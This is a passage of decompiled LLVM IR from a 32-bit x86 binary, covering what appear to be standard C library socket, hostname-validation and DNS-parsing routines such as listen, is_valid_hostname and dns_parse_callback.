  %v4_804b703 = add i32 %v3_804b703, %v1_804b703
  %v5_804b703 = inttoptr i32 %v4_804b703 to i32*
  store i32 %v5_804b6cd, i32* %v5_804b703, align 4
  %v1_804b707 = icmp eq i1 %v4_804b6e5, false
  %v0_804b719 = load i32, i32* @ebx, align 4
  br i1 %v1_804b707, label %dec_label_pc_804b719, label %dec_label_pc_804b709

dec_label_pc_804b709:                             ; preds = %dec_label_pc_804b701
  %v5_804b709 = icmp eq i32 %v0_804b719, 0
  %v9_804b709 = icmp eq i32 %v0_804b719, 1
  br i1 %v9_804b709, label %dec_label_pc_804b73b, label %dec_label_pc_804b70e

dec_label_pc_804b70e:                             ; preds = %dec_label_pc_804b709
  %v9_804b70e = icmp eq i32 %v0_804b719, 2
  br i1 %v9_804b70e, label %dec_label_pc_804b74d, label %dec_label_pc_804b713

dec_label_pc_804b713:                             ; preds = %dec_label_pc_804b70e
  br i1 %v5_804b709, label %dec_label_pc_804b724, label %dec_label_pc_804b75f

dec_label_pc_804b719:                             ; preds = %dec_label_pc_804b701
  %v1_804b719 = add i32 %v0_804b719, 1
  store i32 %v1_804b719, i32* @ebx, align 4
  %v9_804b71a = icmp eq i32 %v0_804b719, 3
  br i1 %v9_804b71a, label %dec_label_pc_804b788, label %dec_label_pc_804b71f

dec_label_pc_804b71f:                             ; preds = %dec_label_pc_804b719
  %v0_804b71f = load i32, i32* @ecx, align 4
  %v1_804b71f = add i32 %v0_804b71f, 1
  br label %dec_label_pc_804b6c4

dec_label_pc_804b724:                             ; preds = %dec_label_pc_804b713
  %v3_804b724 = load i32, i32* %stack_var_-36, align 4
  %v1_804b72a = urem i32 %v3_804b724, 16777216
  store i32 %v1_804b72a, i32* %edx.global-to-local, align 4
  %v2_804b730 = udiv i32 %v3_804b724, 16777216
  store i32 %v2_804b730, i32* %eax.global-to-local, align 4
  %v5_804b733 = trunc i32 %v3_804b724 to i16
  store i32 %v2_804b730, i32* %stack_var_-36, align 4
  br label %dec_label_pc_804b73b

dec_label_pc_804b73b:                             ; preds = %dec_label_pc_804b709, %dec_label_pc_804b724
  %stack_var_-32.0 = phi i16 [ %tmp12, %dec_label_pc_804b709 ], [ %v5_804b733, %dec_label_pc_804b724 ]
  %v4_804b73b = sext i16 %stack_var_-32.0 to i32
  %v1_804b73f = urem i32 %v4_804b73b, 65536
  store i32 %v1_804b73f, i32* %edx.global-to-local, align 4
  %v2_804b742 = udiv i32 %v4_804b73b, 65536
  store i32 %v2_804b742, i32* %eax.global-to-local, align 4
  %v5_804b745 = trunc i16 %stack_var_-32.0 to i8
  br label %dec_label_pc_804b74d

dec_label_pc_804b74d:                             ; preds = %dec_label_pc_804b70e, %dec_label_pc_804b73b
  %stack_var_-28.0 = phi i8 [ %v5_804b745, %dec_label_pc_804b73b ], [ %tmp11, %dec_label_pc_804b70e ]
  %v4_804b74d = sext i8 %stack_var_-28.0 to i32
  %v1_804b751 = urem i32 %v4_804b74d, 256
  store i32 %v1_804b751, i32* %edx.global-to-local, align 4
  %v2_804b754 = udiv i32 %v4_804b74d, 256
  store i32 %v2_804b754, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b75f

dec_label_pc_804b75f:                             ; preds = %dec_label_pc_804b713, %dec_label_pc_804b74d
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %v2_804b6b4, i32* @ecx, align 4
  %v4_804b777 = add i32 %arg2, -1
  br label %dec_label_pc_804b768

dec_label_pc_804b768:                             ; preds = %dec_label_pc_804b773.dec_label_pc_804b768_crit_edge, %dec_label_pc_804b75f
  %v2_804b777 = phi i32 [ %v1_804b77b, %dec_label_pc_804b773.dec_label_pc_804b768_crit_edge ], [ 1, %dec_label_pc_804b75f ]
  %v0_804b768 = phi i32 [ %v0_804b768.pre, %dec_label_pc_804b773.dec_label_pc_804b768_crit_edge ], [ %v2_804b6b4, %dec_label_pc_804b75f ]
  %v2_804b768 = mul i32 %v2_804b777, 4
  %v3_804b768 = add i32 %v0_804b768, -4
  %v4_804b768 = add i32 %v3_804b768, %v2_804b768
  %v5_804b768 = inttoptr i32 %v4_804b768 to i32*
  %v6_804b768 = load i32, i32* %v5_804b768, align 4
  store i32 %v6_804b768, i32* %eax.global-to-local, align 4
  %v6_804b771 = icmp ugt i32 %v6_804b768, 255
  br i1 %v6_804b771, label %dec_label_pc_804b788, label %dec_label_pc_804b773

dec_label_pc_804b773:                             ; preds = %dec_label_pc_804b768
  %v1_804b777 = trunc i32 %v6_804b768 to i8
  %v5_804b777 = add i32 %v4_804b777, %v2_804b777
  %v6_804b777 = inttoptr i32 %v5_804b777 to i8*
  store i8 %v1_804b777, i8* %v6_804b777, align 1
  %v0_804b77b = load i32, i32* %edx.global-to-local, align 4
  %v1_804b77b = add i32 %v0_804b77b, 1
  store i32 %v1_804b77b, i32* %edx.global-to-local, align 4
  %v9_804b77c = icmp eq i32 %v0_804b77b, 4
  %v1_804b77f = icmp eq i1 %v9_804b77c, false
  br i1 %v1_804b77f, label %dec_label_pc_804b773.dec_label_pc_804b768_crit_edge, label %dec_label_pc_804b78a

dec_label_pc_804b773.dec_label_pc_804b768_crit_edge: ; preds = %dec_label_pc_804b773
  %v0_804b768.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804b768

dec_label_pc_804b788:                             ; preds = %dec_label_pc_804b719, %dec_label_pc_804b6f2, %dec_label_pc_804b6e9, %dec_label_pc_804b6c4, %dec_label_pc_804b768
  br label %dec_label_pc_804b78a

dec_label_pc_804b78a:                             ; preds = %dec_label_pc_804b773, %dec_label_pc_804b788
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804b788 ], [ 1, %dec_label_pc_804b773 ]
  store i32 %storemerge4, i32* %eax.global-to-local, align 4
  %v2_804b78d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b78d, i32* @ebx, align 4
  store i32 %v0_804b6ac, i32* @esi, align 4
  store i32 %v0_804b6ab, i32* @edi, align 4
  store i32 %v0_804b6a8, i32* @ebp, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_804b77b, { 1, 0 }
  uselistorder i32 %v2_804b730, { 1, 0 }
  uselistorder i32 %v3_804b724, { 2, 0, 1 }
  uselistorder i32 %v0_804b719, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_804b6d9, { 1, 0 }
  uselistorder i8** %stack_var_-20, { 1, 0 }
  uselistorder label %dec_label_pc_804b78a, { 1, 0 }
  uselistorder label %dec_label_pc_804b788, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804b75f, { 1, 0 }
  uselistorder label %dec_label_pc_804b74d, { 1, 0 }
  uselistorder label %dec_label_pc_804b73b, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 4, i32* @edx, align 4
  store i32 102, i32* @eax, align 4
  %v1_804b7d5 = call i32 @__vsyscall(i32 %arg1)
  %v1_804b7de = call i32 @__syscall_ret(i32 %v1_804b7d5)
  ret i32 %v1_804b7de
}

define i32 @scopeof() local_unnamed_addr {
entry:
  %v0_804b7e8 = load i32, i32* @eax, align 4
  %v1_804b7e8 = inttoptr i32 %v0_804b7e8 to i8*
  %v2_804b7e8 = load i8, i8* %v1_804b7e8, align 1
  %v3_804b7e8 = zext i8 %v2_804b7e8 to i32
  %v4_804b7e8 = load i32, i32* @ecx, align 4
  %v5_804b7e8 = and i32 %v4_804b7e8, -256
  %v6_804b7e8 = or i32 %v5_804b7e8, %v3_804b7e8
  store i32 %v6_804b7e8, i32* @ecx, align 4
  %v11_804b7ec = icmp eq i8 %v2_804b7e8, -1
  %v1_804b7ef = icmp eq i1 %v11_804b7ec, false
  br i1 %v1_804b7ef, label %dec_label_pc_804b7fa, label %dec_label_pc_804b7f1

dec_label_pc_804b7f1:                             ; preds = %entry
  %v1_804b7f1 = add i32 %v0_804b7e8, 1
  %v2_804b7f1 = inttoptr i32 %v1_804b7f1 to i8*
  %v3_804b7f1 = load i8, i8* %v2_804b7f1, align 1
  %tmp = urem i8 %v3_804b7f1, 16
  %v1_804b7f5 = zext i8 %tmp to i32
  br label %dec_label_pc_804b85e

dec_label_pc_804b7fa:                             ; preds = %entry
  %v11_804b7fa = icmp eq i8 %v2_804b7e8, -2
  %v1_804b7fd = icmp eq i1 %v11_804b7fa, false
  br i1 %v1_804b7fd, label %dec_label_pc_804b80d, label %dec_label_pc_804b7ff

dec_label_pc_804b7ff:                             ; preds = %dec_label_pc_804b7fa
  %v1_804b7ff = add i32 %v0_804b7e8, 1
  %v2_804b7ff = inttoptr i32 %v1_804b7ff to i8*
  %v3_804b7ff = load i8, i8* %v2_804b7ff, align 1
  %v1_804b803 = and i8 %v3_804b7ff, -64
  %v7_804b808 = icmp eq i8 %v1_804b803, -128
  br i1 %v7_804b808, label %dec_label_pc_804b852, label %dec_label_pc_804b80d

dec_label_pc_804b80d:                             ; preds = %dec_label_pc_804b7ff, %dec_label_pc_804b7fa
  %v1_804b80d = inttoptr i32 %v0_804b7e8 to i32*
  %v2_804b80d = load i32, i32* %v1_804b80d, align 4
  %v3_804b80d = icmp eq i32 %v2_804b80d, 0
  %v1_804b810 = icmp eq i1 %v3_804b80d, false
  br i1 %v1_804b810, label %dec_label_pc_804b836, label %dec_label_pc_804b812

dec_label_pc_804b812:                             ; preds = %dec_label_pc_804b80d
  %v1_804b812 = add i32 %v0_804b7e8, 4
  %v2_804b812 = inttoptr i32 %v1_804b812 to i32*
  %v3_804b812 = load i32, i32* %v2_804b812, align 4
  %v4_804b812 = icmp eq i32 %v3_804b812, 0
  %v1_804b816 = icmp eq i1 %v4_804b812, false
  br i1 %v1_804b816, label %dec_label_pc_804b836, label %dec_label_pc_804b818

dec_label_pc_804b818:                             ; preds = %dec_label_pc_804b812
  %v1_804b818 = add i32 %v0_804b7e8, 8
  %v2_804b818 = inttoptr i32 %v1_804b818 to i32*
  %v3_804b818 = load i32, i32* %v2_804b818, align 4
  %v4_804b818 = icmp eq i32 %v3_804b818, 0
  %v1_804b81c = icmp eq i1 %v4_804b818, false
  br i1 %v1_804b81c, label %dec_label_pc_804b836, label %dec_label_pc_804b81e

dec_label_pc_804b81e:                             ; preds = %dec_label_pc_804b818
  %v1_804b81e = add i32 %v0_804b7e8, 12
  %v2_804b81e = inttoptr i32 %v1_804b81e to i8*
  %v3_804b81e = load i8, i8* %v2_804b81e, align 1
  %v4_804b81e = icmp eq i8 %v3_804b81e, 0
  %v1_804b822 = icmp eq i1 %v4_804b81e, false
  br i1 %v1_804b822, label %dec_label_pc_804b836, label %dec_label_pc_804b824

dec_label_pc_804b824:                             ; preds = %dec_label_pc_804b81e
  %v1_804b824 = add i32 %v0_804b7e8, 13
  %v2_804b824 = inttoptr i32 %v1_804b824 to i8*
  %v3_804b824 = load i8, i8* %v2_804b824, align 1
  %v4_804b824 = icmp eq i8 %v3_804b824, 0
  %v1_804b828 = icmp eq i1 %v4_804b824, false
  br i1 %v1_804b828, label %dec_label_pc_804b836, label %dec_label_pc_804b82a

dec_label_pc_804b82a:                             ; preds = %dec_label_pc_804b824
  %v1_804b82a = add i32 %v0_804b7e8, 14
  %v2_804b82a = inttoptr i32 %v1_804b82a to i8*
  %v3_804b82a = load i8, i8* %v2_804b82a, align 1
  %v4_804b82a = icmp eq i8 %v3_804b82a, 0
  %v1_804b82e = icmp eq i1 %v4_804b82a, false
  br i1 %v1_804b82e, label %dec_label_pc_804b836, label %dec_label_pc_804b830

dec_label_pc_804b830:                             ; preds = %dec_label_pc_804b82a
  %v1_804b830 = add i32 %v0_804b7e8, 15
  %v2_804b830 = inttoptr i32 %v1_804b830 to i8*
  %v3_804b830 = load i8, i8* %v2_804b830, align 1
  %v12_804b830 = icmp eq i8 %v3_804b830, 1
  br i1 %v12_804b830, label %dec_label_pc_804b852, label %dec_label_pc_804b836

dec_label_pc_804b836:                             ; preds = %dec_label_pc_804b830, %dec_label_pc_804b82a, %dec_label_pc_804b824, %dec_label_pc_804b81e, %dec_label_pc_804b818, %dec_label_pc_804b812, %dec_label_pc_804b80d
  br i1 %v1_804b7fd, label %dec_label_pc_804b859, label %dec_label_pc_804b83b

dec_label_pc_804b83b:                             ; preds = %dec_label_pc_804b836
  %v1_804b83b = add i32 %v0_804b7e8, 1
  %v2_804b83b = inttoptr i32 %v1_804b83b to i8*
  %v3_804b83b = load i8, i8* %v2_804b83b, align 1
  %v6_804b849 = icmp ugt i8 %v3_804b83b, -65
  br i1 %v6_804b849, label %dec_label_pc_804b85e, label %dec_label_pc_804b859

dec_label_pc_804b852:                             ; preds = %dec_label_pc_804b830, %dec_label_pc_804b7ff
  br label %dec_label_pc_804b85e

dec_label_pc_804b859:                             ; preds = %dec_label_pc_804b83b, %dec_label_pc_804b836
  br label %dec_label_pc_804b85e

dec_label_pc_804b85e:                             ; preds = %dec_label_pc_804b83b, %dec_label_pc_804b852, %dec_label_pc_804b7f1, %dec_label_pc_804b859
  %v0_804b85e = phi i32 [ 5, %dec_label_pc_804b83b ], [ 2, %dec_label_pc_804b852 ], [ %v1_804b7f5, %dec_label_pc_804b7f1 ], [ 14, %dec_label_pc_804b859 ]
  ret i32 %v0_804b85e

; uselistorder directives
  uselistorder label %dec_label_pc_804b85e, { 3, 1, 0, 2 }
}

define i32 @addrcmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804b869 = add i32 %arg2, 24
  %v2_804b869 = inttoptr i32 %v1_804b869 to i32*
  %v3_804b869 = load i32, i32* %v2_804b869, align 4
  %v2_804b86c = add i32 %arg1, 24
  %v3_804b86c = inttoptr i32 %v2_804b86c to i32*
  %v4_804b86c = load i32, i32* %v3_804b86c, align 4
  %v5_804b86c = sub i32 %v3_804b869, %v4_804b86c
  ret i32 %v5_804b86c
}

define i32 @name_from_numeric() local_unnamed_addr {
entry:
  %v0_804b873 = load i32, i32* @ecx, align 4
  %v0_804b874 = load i32, i32* @edx, align 4
  %v0_804b875 = load i32, i32* @eax, align 4
  %v3_804b876 = inttoptr i32 %v0_804b875 to i32*
  %v4_804b876 = call i32 @__lookup_ipliteral(i32* %v3_804b876, i32 %v0_804b874, i32 %v0_804b873)
  ret i32 %v4_804b876
}

define i32 @is_valid_hostname() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b87f = load i32, i32* @ebx, align 4
  store i32 %v0_804b87f, i32* %stack_var_-4, align 4
  %v0_804b880 = load i32, i32* @eax, align 4
  store i32 %v0_804b880, i32* @ebx, align 4
  %v2_804b88b = call i32 @strnlen(i32 %v0_804b880, i32 255)
  %v1_804b893 = add i32 %v2_804b88b, -1
  %v6_804b899 = icmp ugt i32 %v1_804b893, 253
  br i1 %v6_804b899, label %dec_label_pc_804b8da, label %dec_label_pc_804b89b

dec_label_pc_804b89b:                             ; preds = %entry
  %v0_804b89e = load i32, i32* @ebx, align 4
  %v4_804b8a1 = call i32 @mbstowcs(i32 0, i32 %v0_804b89e, i32 0, i32 %v1_804b893)
  %v1_804b8a9 = add i32 %v4_804b8a1, 1
  %v8_804b8a9 = icmp eq i32 %v1_804b8a9, 0
  %v1_804b8aa = icmp eq i1 %v8_804b8a9, false
  br i1 %v1_804b8aa, label %dec_label_pc_804b8af.preheader, label %dec_label_pc_804b8da

dec_label_pc_804b8af.preheader:                   ; preds = %dec_label_pc_804b89b
  %v0_804b8af.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b8af

dec_label_pc_804b8ae:                             ; preds = %dec_label_pc_804b8bd.dec_label_pc_804b8ae_crit_edge, %dec_label_pc_804b8b9, %dec_label_pc_804b8b5, %dec_label_pc_804b8af
  %v0_804b8ae = phi i32 [ %v0_804b8ae.pre, %dec_label_pc_804b8bd.dec_label_pc_804b8ae_crit_edge ], [ %v0_804b8af, %dec_label_pc_804b8b9 ], [ %v0_804b8af, %dec_label_pc_804b8b5 ], [ %v0_804b8af, %dec_label_pc_804b8af ]
  %v4_804b8af2 = phi i32 [ %v1_804b8c4, %dec_label_pc_804b8bd.dec_label_pc_804b8ae_crit_edge ], [ %v6_804b8af, %dec_label_pc_804b8b9 ], [ %v6_804b8af, %dec_label_pc_804b8b5 ], [ %v6_804b8af, %dec_label_pc_804b8af ]
  %v1_804b8ae = add i32 %v0_804b8ae, 1
  store i32 %v1_804b8ae, i32* @ebx, align 4
  br label %dec_label_pc_804b8af

dec_label_pc_804b8af:                             ; preds = %dec_label_pc_804b8af.preheader, %dec_label_pc_804b8ae
  %v4_804b8af = phi i32 [ %v1_804b8a9, %dec_label_pc_804b8af.preheader ], [ %v4_804b8af2, %dec_label_pc_804b8ae ]
  %v0_804b8af = phi i32 [ %v0_804b8af.pre, %dec_label_pc_804b8af.preheader ], [ %v1_804b8ae, %dec_label_pc_804b8ae ]
  %v1_804b8af = inttoptr i32 %v0_804b8af to i8*
  %v2_804b8af = load i8, i8* %v1_804b8af, align 1
  %v3_804b8af = zext i8 %v2_804b8af to i32
  %v5_804b8af = and i32 %v4_804b8af, -256
  %v6_804b8af = or i32 %v3_804b8af, %v5_804b8af
  %v5_804b8b1 = icmp slt i8 %v2_804b8af, 0
  br i1 %v5_804b8b1, label %dec_label_pc_804b8ae, label %dec_label_pc_804b8b5

dec_label_pc_804b8b5:                             ; preds = %dec_label_pc_804b8af
  %v10_804b8b5 = icmp eq i8 %v2_804b8af, 46
  br i1 %v10_804b8b5, label %dec_label_pc_804b8ae, label %dec_label_pc_804b8b9

dec_label_pc_804b8b9:                             ; preds = %dec_label_pc_804b8b5
  %v10_804b8b9 = icmp eq i8 %v2_804b8af, 45
  br i1 %v10_804b8b9, label %dec_label_pc_804b8ae, label %dec_label_pc_804b8bd

dec_label_pc_804b8bd:                             ; preds = %dec_label_pc_804b8b9
  %v1_804b8c4 = call i32 @isalnum(i32 %v3_804b8af)
  %v1_804b8cc = icmp eq i32 %v1_804b8c4, 0
  %v1_804b8ce = icmp eq i1 %v1_804b8cc, false
  br i1 %v1_804b8ce, label %dec_label_pc_804b8bd.dec_label_pc_804b8ae_crit_edge, label %dec_label_pc_804b8d0

dec_label_pc_804b8bd.dec_label_pc_804b8ae_crit_edge: ; preds = %dec_label_pc_804b8bd
  %v0_804b8ae.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b8ae

dec_label_pc_804b8d0:                             ; preds = %dec_label_pc_804b8bd
  %v0_804b8d2 = load i32, i32* @ebx, align 4
  %v1_804b8d2 = inttoptr i32 %v0_804b8d2 to i8*
  %v2_804b8d2 = load i8, i8* %v1_804b8d2, align 1
  %v3_804b8d2 = icmp eq i8 %v2_804b8d2, 0
  %v1_804b8d5 = zext i1 %v3_804b8d2 to i32
  br label %dec_label_pc_804b8dc

dec_label_pc_804b8da:                             ; preds = %dec_label_pc_804b89b, %entry
  br label %dec_label_pc_804b8dc

dec_label_pc_804b8dc:                             ; preds = %dec_label_pc_804b8d0, %dec_label_pc_804b8da
  %storemerge = phi i32 [ 0, %dec_label_pc_804b8da ], [ %v1_804b8d5, %dec_label_pc_804b8d0 ]
  %v2_804b8dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b8dc, i32* @edx, align 4
  %v2_804b8de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b8de, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804b8af, { 1, 0 }
  uselistorder i32 %v0_804b8af, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b8dc, { 1, 0 }
  uselistorder label %dec_label_pc_804b8af, { 1, 0 }
}

define i32 @dns_parse_callback(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-268 = alloca i32, align 4
  %v12_804b8e3 = ptrtoint i32* %stack_var_-268 to i32
  store i32 %tmp15, i32* @ebx, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 %arg4, i32* %edx.global-to-local, align 4
  %v9_804b905 = icmp eq i32 %arg2, 5
  br i1 %v9_804b905, label %dec_label_pc_804b98c, label %dec_label_pc_804b911

dec_label_pc_804b911:                             ; preds = %entry
  %v9_804b911 = icmp eq i32 %arg2, 28
  br i1 %v9_804b911, label %dec_label_pc_804b953, label %dec_label_pc_804b916

dec_label_pc_804b916:                             ; preds = %dec_label_pc_804b911
  %v8_804b916 = icmp eq i32 %arg2, 1
  %v1_804b917 = icmp eq i1 %v8_804b916, false
  br i1 %v1_804b917, label %dec_label_pc_804b9d0, label %dec_label_pc_804b91d

dec_label_pc_804b91d:                             ; preds = %dec_label_pc_804b916
  %v9_804b91d = icmp eq i32 %arg4, 4
  %v1_804b920 = icmp eq i1 %v9_804b91d, false
  br i1 %v1_804b920, label %dec_label_pc_804b9cb, label %dec_label_pc_804b926

dec_label_pc_804b926:                             ; preds = %dec_label_pc_804b91d
  %v2_804b926 = add i32 %tmp15, 8
  %v3_804b926 = inttoptr i32 %v2_804b926 to i32*
  %v4_804b926 = load i32, i32* %v3_804b926, align 4
  %v6_804b926 = mul i32 %v4_804b926, 28
  %v2_804b92a = load i32, i32* %arg1, align 4
  store i32 %v2_804b92a, i32* %edx.global-to-local, align 4
  %v2_804b92c = add i32 %v2_804b92a, %v6_804b926
  %v3_804b92c = inttoptr i32 %v2_804b92c to i32*
  store i32 2, i32* %v3_804b92c, align 4
  %v1_804b933 = load i32, i32* @ebx, align 4
  %v2_804b933 = add i32 %v1_804b933, 8
  %v3_804b933 = inttoptr i32 %v2_804b933 to i32*
  %v4_804b933 = load i32, i32* %v3_804b933, align 4
  %v6_804b933 = mul i32 %v4_804b933, 28
  %v1_804b937 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b937 = add i32 %v6_804b933, 4
  %v3_804b937 = add i32 %v2_804b937, %v1_804b937
  %v4_804b937 = inttoptr i32 %v3_804b937 to i32*
  store i32 0, i32* %v4_804b937, align 4
  %v0_804b93f = load i32, i32* @ebx, align 4
  %v1_804b93f = add i32 %v0_804b93f, 8
  %v2_804b93f = inttoptr i32 %v1_804b93f to i32*
  %v3_804b93f = load i32, i32* %v2_804b93f, align 4
  %v3_804b942 = mul i32 %v3_804b93f, 28
  store i32 %v3_804b942, i32* %edx.global-to-local, align 4
  %v1_804b945 = add i32 %v3_804b93f, 1
  %v2_804b946 = inttoptr i32 %v0_804b93f to i32*
  %v3_804b946 = load i32, i32* %v2_804b946, align 4
  %v4_804b946 = add i32 %v3_804b946, %v3_804b942
  store i32 %v4_804b946, i32* %edx.global-to-local, align 4
  store i32 %v1_804b945, i32* %v2_804b93f, align 4
  %v0_804b94c = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b983

dec_label_pc_804b953:                             ; preds = %dec_label_pc_804b911
  %v6_804b953 = icmp eq i32 %arg4, 16
  %v1_804b956 = icmp eq i1 %v6_804b953, false
  br i1 %v1_804b956, label %dec_label_pc_804b9cb, label %dec_label_pc_804b958

dec_label_pc_804b958:                             ; preds = %dec_label_pc_804b953
  %v2_804b958 = add i32 %tmp15, 8
  %v3_804b958 = inttoptr i32 %v2_804b958 to i32*
  %v4_804b958 = load i32, i32* %v3_804b958, align 4
  %v6_804b958 = mul i32 %v4_804b958, 28
  %v2_804b95c = load i32, i32* %arg1, align 4
  store i32 %v2_804b95c, i32* %edx.global-to-local, align 4
  %v2_804b95e = add i32 %v2_804b95c, %v6_804b958
  %v3_804b95e = inttoptr i32 %v2_804b95e to i32*
  store i32 10, i32* %v3_804b95e, align 4
  %v1_804b965 = load i32, i32* @ebx, align 4
  %v2_804b965 = add i32 %v1_804b965, 8
  %v3_804b965 = inttoptr i32 %v2_804b965 to i32*
  %v4_804b965 = load i32, i32* %v3_804b965, align 4
  %v6_804b965 = mul i32 %v4_804b965, 28
  %v1_804b969 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b969 = add i32 %v6_804b965, 4
  %v3_804b969 = add i32 %v2_804b969, %v1_804b969
  %v4_804b969 = inttoptr i32 %v3_804b969 to i32*
  store i32 0, i32* %v4_804b969, align 4
  %v0_804b971 = load i32, i32* @ebx, align 4
  %v1_804b971 = add i32 %v0_804b971, 8
  %v2_804b971 = inttoptr i32 %v1_804b971 to i32*
  %v3_804b971 = load i32, i32* %v2_804b971, align 4
  %v3_804b974 = mul i32 %v3_804b971, 28
  store i32 %v3_804b974, i32* %edx.global-to-local, align 4
  %v1_804b977 = add i32 %v3_804b971, 1
  %v2_804b978 = inttoptr i32 %v0_804b971 to i32*
  %v3_804b978 = load i32, i32* %v2_804b978, align 4
  %v4_804b978 = add i32 %v3_804b978, %v3_804b974
  store i32 %v4_804b978, i32* %edx.global-to-local, align 4
  store i32 %v1_804b977, i32* %v2_804b971, align 4
  %v0_804b97e = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b983

dec_label_pc_804b983:                             ; preds = %dec_label_pc_804b926, %dec_label_pc_804b958
  %storemerge6.in.in = phi i32 [ %v0_804b97e, %dec_label_pc_804b958 ], [ %v0_804b94c, %dec_label_pc_804b926 ]
  %storemerge2 = phi i32 [ 16, %dec_label_pc_804b958 ], [ 4, %dec_label_pc_804b926 ]
  %storemerge6.in = add i32 %storemerge6.in.in, 8
  store i32 %storemerge6.in, i32* %edx.global-to-local, align 4
  %v0_804b983 = load i32, i32* @edi, align 4
  %v3_804b985 = inttoptr i32 %storemerge6.in to i8*
  %v4_804b985 = call i32 @memcpy(i8* %v3_804b985, i32 %v0_804b983, i32 %storemerge2)
  br label %dec_label_pc_804b9c4

dec_label_pc_804b98c:                             ; preds = %entry
  store i32 %v12_804b8e3, i32* @esi, align 4
  %v1_804b99a = add i32 %arg5, 512
  %v5_804b9a2 = inttoptr i32 %arg5 to i8*
  %v6_804b9a2 = call i32 @__dn_expand(i8* %v5_804b9a2, i32 %v1_804b99a, i32 %arg3, i32 %v12_804b8e3, i32 256)
  %tmp30 = icmp slt i32 %v6_804b9a2, 1
  br i1 %tmp30, label %dec_label_pc_804b9d0, label %dec_label_pc_804b9ae

dec_label_pc_804b9ae:                             ; preds = %dec_label_pc_804b98c
  store i32 %v12_804b8e3, i32* @eax, align 4
  %v0_804b9b0 = call i32 @is_valid_hostname()
  %v1_804b9b5 = icmp eq i32 %v0_804b9b0, 0
  br i1 %v1_804b9b5, label %dec_label_pc_804b9ae.dec_label_pc_804b9d0_crit_edge, label %dec_label_pc_804b9b9

dec_label_pc_804b9ae.dec_label_pc_804b9d0_crit_edge: ; preds = %dec_label_pc_804b9ae
  br label %dec_label_pc_804b9d0

dec_label_pc_804b9b9:                             ; preds = %dec_label_pc_804b9ae
  %v0_804b9bc = load i32, i32* @ebx, align 4
  %v1_804b9bc = add i32 %v0_804b9bc, 4
  %v2_804b9bc = inttoptr i32 %v1_804b9bc to i32*
  %v3_804b9bc = load i32, i32* %v2_804b9bc, align 4
  %v2_804b9bf = call i32 @strcpy(i32 %v3_804b9bc, i32 %v12_804b8e3)
  br label %dec_label_pc_804b9c4

dec_label_pc_804b9c4:                             ; preds = %dec_label_pc_804b983, %dec_label_pc_804b9b9
  br label %dec_label_pc_804b9d2

dec_label_pc_804b9cb:                             ; preds = %dec_label_pc_804b953, %dec_label_pc_804b91d
  br label %dec_label_pc_804b9d2

dec_label_pc_804b9d0:                             ; preds = %dec_label_pc_804b9ae.dec_label_pc_804b9d0_crit_edge, %dec_label_pc_804b98c, %dec_label_pc_804b916
  br label %dec_label_pc_804b9d2

dec_label_pc_804b9d2:                             ; preds = %dec_label_pc_804b9cb, %dec_label_pc_804b9c4, %dec_label_pc_804b9d0
  %v0_804b9db = phi i32 [ -1, %dec_label_pc_804b9cb ], [ 0, %dec_label_pc_804b9c4 ], [ 0, %dec_label_pc_804b9d0 ]
  ret i32 %v0_804b9db

; uselistorder directives
  uselistorder i32 %storemerge6.in, { 1, 0 }
  uselistorder i32 %v3_804b971, { 1, 0 }
  uselistorder i32 %v3_804b93f, { 1, 0 }
  uselistorder i32 %v12_804b8e3, { 0, 2, 1, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_804b9d2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b9c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b983, { 1, 0 }
}

define i32 @policyof() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_804b9dd = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804b9e0 = load i32, i32* @esi, align 4
  %v0_804b9e5 = load i32, i32* @eax, align 4
  %v3_804ba0a = inttoptr i32 %v0_804b9e5 to i8*
  br label %dec_label_pc_804b9f1

dec_label_pc_804b9f1:                             ; preds = %dec_label_pc_804ba2c, %entry
  %v0_804b9f8 = phi i32 [ %v0_804b9e5, %entry ], [ %v0_804b9f83, %dec_label_pc_804ba2c ]
  %v0_804b9f1 = phi i32 [ 0, %entry ], [ %v1_804ba30, %dec_label_pc_804ba2c ]
  %stack_var_-20.0 = phi i64 [ 0, %entry ], [ %v22_804ba2c, %dec_label_pc_804ba2c ]
  %v1_804b9f1 = add i32 %v0_804b9f1, ptrtoint (i8** @global_var_80544f0.347 to i32)
  %v2_804b9f1 = inttoptr i32 %v1_804b9f1 to i8*
  %v3_804b9f1 = load i8, i8* %v2_804b9f1, align 1
  %v4_804b9f1 = zext i8 %v3_804b9f1 to i32
  store i32 %v4_804b9f1, i32* @ebx, align 4
  %v7_804b9fa = mul nsw i64 %stack_var_-20.0, 20
  %v8_804b9fa = trunc i64 %v7_804b9fa to i32
  store i32 %v8_804b9fa, i32* @esi, align 4
